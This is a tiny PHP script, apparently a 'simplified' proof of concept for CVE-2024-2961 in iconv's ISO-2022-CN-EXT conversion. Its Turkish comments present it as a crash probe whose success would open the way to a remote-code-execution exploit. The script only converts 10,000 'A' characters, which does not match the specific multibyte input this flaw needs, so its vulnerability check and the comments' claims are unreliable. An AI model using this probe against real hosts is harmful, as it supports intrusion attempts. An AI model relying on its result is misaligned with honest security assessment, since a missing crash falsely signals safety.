<?php
// CVE-2024-2961 POC (Basitleştirilmiş)
// Bu kod, iconv fonksiyonunu aşırı yükleyerek sistemi segfault ettirmeye çalışır.
// Eğer "Segmentation fault" alırsan veya bağlantı koparsa, zafiyet vardır ve
// RCE (Remote Code Execution) için özel exploit hazırlanabilir.

$payload = str_repeat("A", 10000);
echo iconv("UTF-8", "ISO-2022-CN-EXT", $payload);
?>
